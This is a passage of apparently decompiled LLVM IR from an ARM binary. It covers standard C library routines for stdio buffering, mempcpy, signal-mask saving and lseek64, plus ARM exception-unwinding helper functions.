  %v4_18fac = sext i16 %v3_18fac to i32
  store i32 %v4_18fac, i32* %r3.global-to-local, align 4
  %v2_18fb0 = add i32 %v4_18fac, %v0_18fa8
  %v3_18fb0 = inttoptr i32 %v2_18fb0 to i32*
  %v4_18fb0 = load i32, i32* %v3_18fb0, align 4
  store i32 %v4_18fb0, i32* %r3.global-to-local, align 4
  %v7_18fb4 = icmp eq i32 %v4_18fb0, 4
  store i1 %v7_18fb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18fb4, label %dec_label_pc_18fc0, label %bb21

bb21:                                             ; preds = %dec_label_pc_18f98
  %v8_18fb8 = icmp eq i32 %v4_18fb0, 11
  store i1 %v8_18fb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_18fb8, label %dec_label_pc_18fc0, label %dec_label_pc_19024

dec_label_pc_18fc0:                               ; preds = %dec_label_pc_18f98, %bb21
  %v0_18fc0 = load i32, i32* @r4, align 4
  %v1_18fc0 = add i32 %v0_18fc0, 8
  store i32 %v1_18fc0, i32* %r2.global-to-local, align 4
  %v1_18fc4 = inttoptr i32 %v1_18fc0 to i32*
  %v2_18fc4 = load i32, i32* %v1_18fc4, align 4
  store i32 %v2_18fc4, i32* %r2.global-to-local, align 4
  %v3_18fc4 = add i32 %v0_18fc0, 12
  %v4_18fc4 = inttoptr i32 %v3_18fc4 to i32*
  %v5_18fc4 = load i32, i32* %v4_18fc4, align 4
  store i32 %v5_18fc4, i32* %r3.global-to-local, align 4
  %v2_18fc8 = sub i32 %v5_18fc4, %v2_18fc4
  store i32 %v2_18fc8, i32* %r1.global-to-local, align 4
  %v9_18fc8 = icmp eq i32 %v5_18fc4, %v2_18fc4
  store i1 %v9_18fc8, i1* %cpsr_z.global-to-local, align 1
  %v0_19014.pre = load i32, i32* @r5, align 4
  br i1 %v9_18fc8, label %dec_label_pc_19014, label %dec_label_pc_18fd0

dec_label_pc_18fd0:                               ; preds = %dec_label_pc_18fc0
  %v3_18fd0 = icmp ult i32 %v2_18fc8, %v0_19014.pre
  %v9_18fd0 = icmp eq i32 %v2_18fc8, %v0_19014.pre
  store i1 %v9_18fd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18fd0, label %.preheader, label %bb22

bb22:                                             ; preds = %dec_label_pc_18fd0
  store i32 %v0_19014.pre, i32* %r1.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_18fd0, %bb22, %dec_label_pc_18ff8
  %v2_18fe4 = phi i32 [ %v1_18ffc, %dec_label_pc_18ff8 ], [ %v2_18fc4, %bb22 ], [ %v2_18fc4, %dec_label_pc_18fd0 ]
  %v0_18fd8 = load i32, i32* @r6, align 4
  %v1_18fd8 = inttoptr i32 %v0_18fd8 to i8*
  %v2_18fd8 = load i8, i8* %v1_18fd8, align 1
  %v3_18fd8 = zext i8 %v2_18fd8 to i32
  store i32 %v3_18fd8, i32* %r3.global-to-local, align 4
  %v7_18fdc = icmp eq i8 %v2_18fd8, 10
  store i1 %v7_18fdc, i1* %cpsr_z.global-to-local, align 1
  %v1_18fe0 = add i32 %v0_18fd8, 1
  store i32 %v1_18fe0, i32* @r6, align 4
  %v3_18fe4 = inttoptr i32 %v2_18fe4 to i8*
  store i8 %v2_18fd8, i8* %v3_18fe4, align 1
  %v0_18fe8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18fe8, label %dec_label_pc_18fec, label %dec_label_pc_18ff8

dec_label_pc_18fec:                               ; preds = %.preheader
  %v0_18fec = load i32, i32* @r4, align 4
  %v1_18fec = inttoptr i32 %v0_18fec to i16*
  %v2_18fec = load i16, i16* %v1_18fec, align 2
  %v3_18fec = zext i16 %v2_18fec to i32
  store i32 %v3_18fec, i32* %r3.global-to-local, align 4
  %v1_18ff0 = and i32 %v3_18fec, 256
  %v2_18ff0 = icmp eq i32 %v1_18ff0, 0
  store i1 %v2_18ff0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18ff0, label %dec_label_pc_18ff8, label %dec_label_pc_18fec.dec_label_pc_19004_crit_edge

dec_label_pc_18fec.dec_label_pc_19004_crit_edge:  ; preds = %dec_label_pc_18fec
  %v0_19008.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19004

dec_label_pc_18ff8:                               ; preds = %dec_label_pc_18fec, %.preheader
  %v0_18ff8 = load i32, i32* %r1.global-to-local, align 4
  %v1_18ff8 = add i32 %v0_18ff8, -1
  store i32 %v1_18ff8, i32* %r1.global-to-local, align 4
  %v7_18ff8 = icmp eq i32 %v0_18ff8, 1
  store i1 %v7_18ff8, i1* %cpsr_z.global-to-local, align 1
  %v0_18ffc = load i32, i32* %r2.global-to-local, align 4
  %v1_18ffc = add i32 %v0_18ffc, 1
  store i32 %v1_18ffc, i32* %r2.global-to-local, align 4
  br i1 %v7_18ff8, label %dec_label_pc_18ff8.dec_label_pc_19004_crit_edge, label %.preheader

dec_label_pc_18ff8.dec_label_pc_19004_crit_edge:  ; preds = %dec_label_pc_18ff8
  %v0_19004.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19004

dec_label_pc_19004:                               ; preds = %dec_label_pc_18fec.dec_label_pc_19004_crit_edge, %dec_label_pc_18ff8.dec_label_pc_19004_crit_edge
  %v0_19008 = phi i32 [ %v1_18ffc, %dec_label_pc_18ff8.dec_label_pc_19004_crit_edge ], [ %v0_19008.pre, %dec_label_pc_18fec.dec_label_pc_19004_crit_edge ]
  %v0_19004 = phi i32 [ %v0_19004.pre, %dec_label_pc_18ff8.dec_label_pc_19004_crit_edge ], [ %v0_18fec, %dec_label_pc_18fec.dec_label_pc_19004_crit_edge ]
  %v1_19004 = add i32 %v0_19004, 8
  %v2_19004 = inttoptr i32 %v1_19004 to i32*
  %v3_19004 = load i32, i32* %v2_19004, align 4
  store i32 %v3_19004, i32* %r3.global-to-local, align 4
  %v2_19008 = add i32 %v0_19004, 16
  %v3_19008 = inttoptr i32 %v2_19008 to i32*
  store i32 %v0_19008, i32* %v3_19008, align 4
  %v0_1900c = load i32, i32* %r3.global-to-local, align 4
  %v1_1900c = load i32, i32* %r2.global-to-local, align 4
  %v2_1900c = sub i32 %v1_1900c, %v0_1900c
  store i32 %v2_1900c, i32* %r3.global-to-local, align 4
  %v1_19010 = load i32, i32* @r5, align 4
  %v2_19010 = sub i32 %v1_19010, %v2_1900c
  br label %dec_label_pc_19014

dec_label_pc_19014:                               ; preds = %dec_label_pc_18fc0, %dec_label_pc_19004
  %v0_19014 = phi i32 [ %v2_19010, %dec_label_pc_19004 ], [ %v0_19014.pre, %dec_label_pc_18fc0 ]
  %v1_19014 = load i32, i32* @r7, align 4
  %v2_19014 = sub i32 %v1_19014, %v0_19014
  store i32 %v2_19014, i32* @r7, align 4
  br label %dec_label_pc_19024

dec_label_pc_1901cthread-pre-split:               ; preds = %dec_label_pc_18f74
  %v3_18f8c = load i32, i32* @r6, align 4
  %v5_18f8c = add i32 %v3_18f8c, %v3_18f84
  store i32 %v5_18f8c, i32* @r6, align 4
  %v4_18f90 = load i32, i32* @r5, align 4
  %v5_18f90 = sub i32 %v4_18f90, %v3_18f84
  store i32 %v5_18f90, i32* @r5, align 4
  %v2_1901c = icmp eq i32 %v5_18f90, 0
  store i1 %v2_1901c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1901c, label %dec_label_pc_19024, label %dec_label_pc_1901cthread-pre-split.dec_label_pc_18f74_crit_edge

dec_label_pc_1901cthread-pre-split.dec_label_pc_18f74_crit_edge: ; preds = %dec_label_pc_1901cthread-pre-split
  %v3_18f74.pre = load i32, i32* @r8, align 4
  %v0_18f80.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18f74

dec_label_pc_19024:                               ; preds = %dec_label_pc_1901cthread-pre-split, %entry, %bb21, %dec_label_pc_19014
  %v0_19024 = load i32, i32* @r7, align 4
  ret i32 %v0_19024

; uselistorder directives
  uselistorder i32 %v5_18f90, { 1, 3, 0, 2 }
  uselistorder i32 %v5_18f8c, { 1, 0 }
  uselistorder i32 %v0_19004, { 1, 0 }
  uselistorder i32 %v1_18ffc, { 0, 2, 1 }
  uselistorder i32 %v0_18ff8, { 1, 0 }
  uselistorder i32 %v0_19014.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_18fc4, { 1, 0, 2 }
  uselistorder i32 %v2_18fc4, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_18f84, { 1, 0, 2, 3 }
  uselistorder i32 %v0_18f7c, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 1, 4, 2, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i8 10, { 4, 5, 0, 6, 1, 2, 3 }
  uselistorder i32 11, { 10, 7, 8, 9, 18, 24, 26, 0, 11, 12, 13, 14, 2, 15, 16, 17, 19, 20, 3, 21, 4, 22, 1, 23, 25, 5, 27, 28, 29, 6, 30 }
  uselistorder i32 (i32, i32)* @__GI___libc_write, { 2, 1, 0 }
  uselistorder i32 2147483647, { 1, 5, 6, 0, 2, 3, 4 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_19024, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_19014, { 1, 0 }
  uselistorder label %dec_label_pc_19004, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18fc0, { 1, 0 }
  uselistorder label %dec_label_pc_18f74, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19034 = load i32, i32* @r4, align 4
  store i32 %v3_19034, i32* %stack_var_-8, align 4
  %v1_19038 = add i32 %arg1, 8
  %v1_1903c = inttoptr i32 %v1_19038 to i32*
  %v2_1903c = load i32, i32* %v1_1903c, align 4
  store i32 %v2_1903c, i32* @r1, align 4
  %v3_1903c = add i32 %arg1, 12
  %v4_1903c = inttoptr i32 %v3_1903c to i32*
  %v5_1903c = load i32, i32* %v4_1903c, align 4
  %v2_19040 = sub i32 %v5_1903c, %v2_1903c
  store i32 %v2_19040, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_19048 = inttoptr i32 %arg1 to i16*
  %v4_19048 = call i32 @__stdio_READ(i16* %v3_19048, i32 %v2_1903c, i32 %v2_19040)
  %v0_1904c = load i32, i32* @r4, align 4
  %v1_1904c = add i32 %v0_1904c, 8
  %v2_1904c = inttoptr i32 %v1_1904c to i32*
  %v3_1904c = load i32, i32* %v2_1904c, align 4
  store i32 %v3_1904c, i32* %r2.global-to-local, align 4
  %v2_19050 = add i32 %v3_1904c, %v4_19048
  %v2_19054 = add i32 %v0_1904c, 20
  %v3_19054 = inttoptr i32 %v2_19054 to i32*
  store i32 %v2_19050, i32* %v3_19054, align 4
  %v0_19058 = load i32, i32* %r2.global-to-local, align 4
  %v1_19058 = load i32, i32* @r4, align 4
  %v2_19058 = add i32 %v1_19058, 16
  %v3_19058 = inttoptr i32 %v2_19058 to i32*
  store i32 %v0_19058, i32* %v3_19058, align 4
  %v2_1905c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1905c, i32* @r4, align 4
  ret i32 %v4_19048

; uselistorder directives
  uselistorder i32 %v4_19048, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_19064 = load i32, i32* @r4, align 4
  store i32 %v3_19064, i32* %stack_var_-12, align 4
  %v0_19068 = load i32, i32* @r0, align 4
  %v1_19068 = inttoptr i32 %v0_19068 to i16*
  %v2_19068 = load i16, i16* %v1_19068, align 2
  %v3_19068 = zext i16 %v2_19068 to i32
  store i32 %v3_19068, i32* %r3.global-to-local, align 4
  %v0_1906c = load i32, i32* @r1, align 4
  %v2_1906c = and i32 %v0_1906c, %v3_19068
  %v4_1906c = icmp eq i32 %v2_1906c, 0
  store i32 %v0_19068, i32* @r4, align 4
  br i1 %v4_1906c, label %dec_label_pc_1907c, label %dec_label_pc_1908c

dec_label_pc_1907c:                               ; preds = %entry
  %v1_1907c = and i32 %v3_19068, 2176
  %v2_1907c = icmp eq i32 %v1_1907c, 0
  br i1 %v2_1907c, label %dec_label_pc_19084, label %dec_label_pc_19098

dec_label_pc_19084:                               ; preds = %dec_label_pc_1907c
  %v2_19084 = or i32 %v0_1906c, %v3_19068
  store i32 %v2_19084, i32* %r3.global-to-local, align 4
  %v1_19088 = trunc i32 %v2_19084 to i16
  store i16 %v1_19088, i16* %v1_19068, align 2
  %v0_1908c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1908c

dec_label_pc_1908c:                               ; preds = %entry, %dec_label_pc_19084
  %v0_1908c = phi i32 [ %v0_19068, %entry ], [ %v0_1908c.pre, %dec_label_pc_19084 ]
  %v1_1908c = inttoptr i32 %v0_1908c to i16*
  %v2_1908c = load i16, i16* %v1_1908c, align 2
  %v3_1908c = zext i16 %v2_1908c to i32
  store i32 %v3_1908c, i32* %r3.global-to-local, align 4
  %v1_19090 = and i32 %v3_1908c, 16
  store i32 %v1_19090, i32* %r5.global-to-local, align 4
  %v2_19090 = icmp eq i32 %v1_19090, 0
  br i1 %v2_19090, label %dec_label_pc_190c0, label %dec_label_pc_19098

dec_label_pc_19098:                               ; preds = %dec_label_pc_1907c, %dec_label_pc_1908c
  store i32 ptrtoint (i32* @global_var_a328.65 to i32), i32* %r3.global-to-local, align 4
  %v0_1909c = call i32 @__aeabi_read_tp()
  store i32 %v0_1909c, i32* %r0.global-to-local, align 4
  %v3_190a0 = load i16, i16* @global_var_233d0.483, align 2
  %v4_190a0 = sext i16 %v3_190a0 to i32
  store i32 %v4_190a0, i32* %r3.global-to-local, align 4
  %v3_190a8 = add i32 %v4_190a0, %v0_1909c
  %v4_190a8 = inttoptr i32 %v3_190a8 to i32*
  store i32 9, i32* %v4_190a8, align 4
  br label %dec_label_pc_190ac

dec_label_pc_190ac:                               ; preds = %dec_label_pc_190c8, %dec_label_pc_19098
  %v0_190ac = load i32, i32* @r4, align 4
  %v1_190ac = inttoptr i32 %v0_190ac to i16*
  %v2_190ac = load i16, i16* %v1_190ac, align 2
  %v3_190ac = zext i16 %v2_190ac to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_190b4 = or i32 %v3_190ac, 8
  store i32 %v1_190b4, i32* %r3.global-to-local, align 4
  %v1_190b8 = trunc i32 %v1_190b4 to i16
  store i16 %v1_190b8, i16* %v1_190ac, align 2
  %v1_19100.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_190f8

dec_label_pc_190c0:                               ; preds = %dec_label_pc_1908c
  %v1_190c0 = and i32 %v3_1908c, 64
  %v2_190c0 = icmp eq i32 %v1_190c0, 0
  br i1 %v2_190c0, label %dec_label_pc_190e8, label %dec_label_pc_190c8

dec_label_pc_190c8:                               ; preds = %dec_label_pc_190c0
  %v0_190c8 = load i32, i32* @r0, align 4
  %v1_190c8 = call i32 @__stdio_wcommit(i32 %v0_190c8)
  store i32 %v1_190c8, i32* %r0.global-to-local, align 4
  %v2_190cc = icmp eq i32 %v1_190c8, 0
  br i1 %v2_190cc, label %dec_label_pc_190d4, label %dec_label_pc_190ac

dec_label_pc_190d4:                               ; preds = %dec_label_pc_190c8
  %v0_190d4 = load i32, i32* @r4, align 4
  %v1_190d4 = inttoptr i32 %v0_190d4 to i16*
  %v2_190d4 = load i16, i16* %v1_190d4, align 2
  %v3_190d4 = zext i16 %v2_190d4 to i32
  store i32 %v3_190d4, i32* %r3.global-to-local, align 4
  %v1_190d8 = add i32 %v0_190d4, 8
  %v2_190d8 = inttoptr i32 %v1_190d8 to i32*
  %v3_190d8 = load i32, i32* %v2_190d8, align 4
  %v1_190dc = and i32 %v3_190d4, 65471
  store i32 %v1_190dc, i32* %r3.global-to-local, align 4
  %v2_190e0 = add i32 %v0_190d4, 28
  %v3_190e0 = inttoptr i32 %v2_190e0 to i32*
  store i32 %v3_190d8, i32* %v3_190e0, align 4
  %v0_190e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_190e4 = trunc i32 %v0_190e4 to i16
  %v2_190e4 = load i32, i32* @r4, align 4
  %v3_190e4 = inttoptr i32 %v2_190e4 to i16*
  store i16 %v1_190e4, i16* %v3_190e4, align 2
  %v0_190e8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_190e8

dec_label_pc_190e8:                               ; preds = %dec_label_pc_190c0, %dec_label_pc_190d4
  %v2_190f0 = phi i32 [ %v0_1908c, %dec_label_pc_190c0 ], [ %v0_190e8.pre, %dec_label_pc_190d4 ]
  %v1_190e8 = inttoptr i32 %v2_190f0 to i16*
  %v2_190e8 = load i16, i16* %v1_190e8, align 2
  %v3_190e8 = zext i16 %v2_190e8 to i32
  %v1_190ec = or i32 %v3_190e8, 1
  store i32 %v1_190ec, i32* %r3.global-to-local, align 4
  %v1_190f0 = trunc i32 %v1_190ec to i16
  store i16 %v1_190f0, i16* %v1_190e8, align 2
  %v0_190f4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_190f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_190f8

dec_label_pc_190f8:                               ; preds = %dec_label_pc_190ac, %dec_label_pc_190e8
  %v1_19100 = phi i32 [ %v1_19100.pre, %dec_label_pc_190ac ], [ %v0_190f4, %dec_label_pc_190e8 ]
  %v2_190fc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_190fc, i32* @r4, align 4
  ret i32 %v1_19100

; uselistorder directives
  uselistorder i32 %v3_19068, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_190f8, { 1, 0 }
  uselistorder label %dec_label_pc_190e8, { 1, 0 }
  uselistorder label %dec_label_pc_19098, { 1, 0 }
  uselistorder label %dec_label_pc_1908c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_19108 = load i32, i32* @r4, align 4
  %v6_19108 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_19118 = call i32 @memcpy()
  %v0_1911c = load i32, i32* @r5, align 4
  %v1_1911c = load i32, i32* @r4, align 4
  %v2_1911c = add i32 %v1_1911c, %v0_1911c
  store i32 %v3_19108, i32* @r4, align 4
  store i32 %v6_19108, i32* @r5, align 4
  ret i32 %v2_1911c
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_1912c = load i32, i32* @r1, align 4
  %v2_1912c = icmp eq i32 %v0_1912c, 0
  %v3_19130 = load i32, i32* @r4, align 4
  store i32 %v3_19130, i32* %stack_var_-8, align 4
  %v0_19134 = load i32, i32* @r0, align 4
  store i32 %v0_19134, i32* %r4.global-to-local, align 4
  br i1 %v2_1912c, label %dec_label_pc_19158, label %dec_label_pc_1913c

dec_label_pc_1913c:                               ; preds = %entry
  %v1_19144 = add i32 %v0_19134, 260
  %v4_19148 = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_19144)
  %v2_1914c = icmp eq i32 %v4_19148, 0
  br i1 %v2_1914c, label %dec_label_pc_1915c, label %dec_label_pc_19158

dec_label_pc_19158:                               ; preds = %dec_label_pc_1913c, %entry
  br label %dec_label_pc_1915c

dec_label_pc_1915c:                               ; preds = %dec_label_pc_1913c, %dec_label_pc_19158
  %storemerge = phi i32 [ 0, %dec_label_pc_19158 ], [ 1, %dec_label_pc_1913c ]
  %v1_19160 = load i32, i32* %r4.global-to-local, align 4
  %v2_19160 = add i32 %v1_19160, 256
  %v3_19160 = inttoptr i32 %v2_19160 to i32*
  store i32 %storemerge, i32* %v3_19160, align 4
  %v2_19164 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19164, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32*, i32)* @__GI_sigprocmask, { 2, 1, 0 }
  uselistorder i32* null, { 11, 0, 4, 5, 1, 6, 7, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 2, 22, 23, 24, 25, 26, 8, 27, 28, 29, 30, 31, 3, 32, 33, 34, 37, 35, 36, 50, 38, 10, 39, 40, 41, 42, 43, 44, 45, 46, 47, 9, 48, 49 }
  uselistorder i32 260, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1915c, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_191b4, label %dec_label_pc_19198

dec_label_pc_19198:                               ; preds = %entry
  %v0_1919c = call i32 @__aeabi_read_tp()
  %v3_191a0 = load i16, i16* @global_var_233d0.483, align 2
  %v4_191a0 = sext i16 %v3_191a0 to i32
  %v0_191a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_191a4 = sub i32 0, %v0_191a4
  store i32 %v1_191a4, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_191ac = add i32 %v4_191a0, %v0_1919c
  %v4_191ac = inttoptr i32 %v3_191ac to i32*
  store i32 %v1_191a4, i32* %v4_191ac, align 4
  %v0_191bc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_191bc

dec_label_pc_191b4:                               ; preds = %entry
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_191b4 = icmp eq i32 %arg1, 0
  br i1 %v2_191b4, label %dec_label_pc_191c8, label %dec_label_pc_191bc

dec_label_pc_191bc:                               ; preds = %dec_label_pc_191b4, %dec_label_pc_19198
  %v0_191bc = phi i32 [ %arg1, %dec_label_pc_191b4 ], [ %v0_191bc.pre, %dec_label_pc_19198 ]
  %v3_191c0 = ashr i32 %v0_191bc, 31
  br label %dec_label_pc_191cc

dec_label_pc_191c8:                               ; preds = %dec_label_pc_191b4
  br label %dec_label_pc_191cc

dec_label_pc_191cc:                               ; preds = %dec_label_pc_191bc, %dec_label_pc_191c8
  %v1_191d4 = phi i32 [ %v0_191bc, %dec_label_pc_191bc ], [ %tmp8, %dec_label_pc_191c8 ]
  %storemerge = phi i32 [ %v3_191c0, %dec_label_pc_191bc ], [ %tmp, %dec_label_pc_191c8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_191d4

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 31, { 9, 4, 5, 11, 0, 6, 1, 7, 2, 8, 10, 3 }
  uselistorder i16 8, { 3, 0, 1, 2, 4 }
  uselistorder i16* @global_var_233d0.483, { 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__aeabi_read_tp, { 62, 68, 67, 61, 60, 77, 76, 65, 66, 64, 63, 75, 74, 73, 72, 71, 70, 69, 31, 30, 33, 29, 59, 46, 45, 12, 6, 5, 11, 28, 27, 10, 3, 2, 15, 9, 8, 7, 56, 32, 14, 13, 24, 26, 25, 55, 54, 23, 22, 34, 21, 35, 20, 47, 19, 53, 18, 36, 52, 17, 58, 57, 44, 41, 40, 39, 4, 51, 16, 38, 50, 37, 49, 48, 0, 1, 43, 42 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_191cc, { 1, 0 }
}

define i32 @_Unwind_VRS_Get(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_191dc = icmp eq i32 %regclass, 0
  br i1 %v2_191dc, label %dec_label_pc_191e4, label %dec_label_pc_19214

dec_label_pc_191e4:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_191e4
  %v6_191e8 = icmp eq i32 %representation, 0
  br i1 %v6_191e8, label %dec_label_pc_191f8, label %bb8

.thread3:                                         ; preds = %dec_label_pc_191e4
  br label %dec_label_pc_19220

bb8:                                              ; preds = %bb
  br label %dec_label_pc_19220

dec_label_pc_191f8:                               ; preds = %bb
  %v3_191f8 = mul i32 %regno, 4
  %v2_191fc = add i32 %v3_191f8, %context
  %v1_19200 = add i32 %v2_191fc, 4
  %v2_19200 = inttoptr i32 %v1_19200 to i32*
  %v3_19200 = load i32, i32* %v2_19200, align 4
  %v2_1920c = bitcast i8* %valuep to i32*
  store i32 %v3_19200, i32* %v2_1920c, align 4
  ret i32 0

dec_label_pc_19214:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_19214
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_19214, %bb9
  %v0_1921c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_1921c)
  br label %dec_label_pc_19220

dec_label_pc_19220:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_19220, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_19228 = icmp eq i32 %regclass, 0
  br i1 %v2_19228, label %dec_label_pc_19230, label %dec_label_pc_19260

dec_label_pc_19230:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_19230
  %v6_19234 = icmp eq i32 %representation, 0
  br i1 %v6_19234, label %dec_label_pc_19244, label %bb8

.thread3:                                         ; preds = %dec_label_pc_19230
  br label %dec_label_pc_1926c

bb8:                                              ; preds = %bb
  br label %dec_label_pc_1926c

dec_label_pc_19244:                               ; preds = %bb
  %v3_19248 = mul i32 %regno, 4
  %v1_1924c = bitcast i8* %valuep to i32*
  %v2_1924c = load i32, i32* %v1_1924c, align 4
  %v2_19250 = add i32 %v3_19248, %context
  %v2_19258 = add i32 %v2_19250, 4
  %v3_19258 = inttoptr i32 %v2_19258 to i32*
  store i32 %v2_1924c, i32* %v3_19258, align 4
  ret i32 0

dec_label_pc_19260:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_19260
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_19260, %bb9
  %v0_19268 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_19268)
  br label %dec_label_pc_1926c

dec_label_pc_1926c:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_1926c, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
  %v1_19274 = add i32 %context, 68
  %v2_19274 = inttoptr i32 %v1_19274 to i32*
  %v3_19274 = load i32, i32* %v2_19274, align 4
  ret i32 %v3_19274

; uselistorder directives
  uselistorder i32 68, { 10, 8, 0, 9, 1, 3, 4, 5, 6, 2, 7 }
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_19284 = add i32 %exc, 8
  %v2_19284 = inttoptr i32 %v1_19284 to i32*
  %v3_19284 = load i32, i32* %v2_19284, align 4
  %v2_19288 = icmp eq i32 %v3_19284, 0
  br i1 %v2_19288, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_1929c = xor i1 %v2_19288, true
  call void @__pseudo_cond_branch(i1 %v2_1929c, i32 %v3_19284)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
